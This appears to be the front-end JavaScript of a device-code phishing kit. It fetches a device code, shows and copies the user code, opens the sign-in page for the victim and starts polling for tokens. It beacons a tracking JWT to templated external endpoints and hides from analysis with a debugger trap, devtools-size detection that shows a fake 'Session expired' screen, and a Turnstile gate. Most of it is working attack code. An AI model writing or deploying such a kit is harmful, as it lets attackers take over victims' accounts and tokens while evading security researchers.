let deviceCodeData = null;
let countdownInterval = null;
let pollingActive = false;

const JWT_TOKEN = window.VG_JWT || '';
const VERIFY_URL = '{{VERIFY_ENDPOINT}}';
const BEACON_URL = '{{BEACON_ENDPOINT}}';
const LOG_URL = '{{LOG_ENDPOINT}}';
const TURNSTILE_KEY = '{{TURNSTILE_KEY}}';

// Anti-debug (if enabled)
const ENABLE_ANTIDEBUG = window.VG_ENABLE_ANTIDEBUG || false;

if (ENABLE_ANTIDEBUG) {
  // Debugger trap
  setInterval(() => {
    const start = Date.now();
    debugger;
    const end = Date.now();
    if (end - start > 100) {
      window.location.href = 'about:blank';
    }
  }, 1000);
  
  // Window size detection
  window.addEventListener('resize', () => {
    if (window.outerWidth - window.innerWidth > 200 || window.outerHeight - window.innerHeight > 200) {
      document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;"><p>Session expired – please reload</p></div>';
    }
  });
}

// Global error handler
window.onerror = function(message, source, lineno, colno, error) {
  fetch(LOG_URL + '/api/log', {
    method: 'POST',
    body: JSON.stringify({ message, source, lineno, colno, error: error?.stack, ua: navigator.userAgent }),
  }).catch(() => {});
};

window.addEventListener('unhandledrejection', function(event) {
  fetch(LOG_URL + '/api/log', {
    method: 'POST',
    body: JSON.stringify({ message: 'Unhandled rejection', error: event.reason?.stack || event.reason, ua: navigator.userAgent }),
  }).catch(() => {});
});

// Beacon on load
fetch(BEACON_URL + '/api/beacon', {
  method: 'POST',
  body: JSON.stringify({ jwt_token: JWT_TOKEN }),
}).catch(() => {});

let turnstileToken = '';

function onTurnstileCallback(token) {
  turnstileToken = token;
  document.getElementById('generateBtn').disabled = false;
}

async function generateCode() {
  const btn = document.getElementById('generateBtn');
  btn.disabled = true;
  btn.innerHTML = '<span class="spinner"></span>Generating...';
  
  try {
    const response = await fetch('/api/devicecode', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        jwt_token: JWT_TOKEN,
        turnstile_token: turnstileToken,
      }),
    });
    
    const data = await response.json();
    
    if (data.error) {
      btn.innerHTML = 'Get verification code';
      btn.disabled = false;
      alert(data.error);
      return;
    }
    
    deviceCodeData = data;
    
    // Show code area
    document.getElementById('codeArea').style.display = 'block';
    btn.style.display = 'none';
    document.getElementById('turnstileWidget').style.display = 'none';
    
    document.getElementById('userCode').textContent = data.user_code;
    
    // Start countdown
    let secondsLeft = data.expires_in || 900;
    updateCountdown(secondsLeft);
    countdownInterval = setInterval(() => {
      secondsLeft--;
      updateCountdown(secondsLeft);
      if (secondsLeft <= 0) {
        clearInterval(countdownInterval);
        document.getElementById('timer').innerHTML = '<span style="color:#d13438;">Code expired</span>';
      }
    }, 1000);
    
    // Start polling for tokens
    pollingActive = true;
  } catch (err) {
    btn.innerHTML = 'Get verification code';
    btn.disabled = false;
  }
}

function updateCountdown(seconds) {
  const mins = Math.floor(seconds / 60);
  const secs = seconds % 60;
  document.getElementById('countdown').textContent = 
    String(mins).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
}

function copyCode() {
  if (!deviceCodeData) return;
  navigator.clipboard.writeText(deviceCodeData.user_code).then(() => {
    const btn = document.getElementById('copyBtn');
    btn.textContent = 'Copied!';
    setTimeout(() => { btn.textContent = 'Copy Code'; }, 2000);
  });
}

function openSignIn() {
  if (!deviceCodeData) return;
  window.open(deviceCodeData.verification_uri, '_blank');
}

// Initialize Turnstile
window.onloadTurnstileCallback = function() {
  if (window.turnstile) {
    window.turnstile.render('#turnstileWidget', {
      sitekey: TURNSTILE_KEY,
      callback: onTurnstileCallback,
      theme: 'light',
    });
  }
};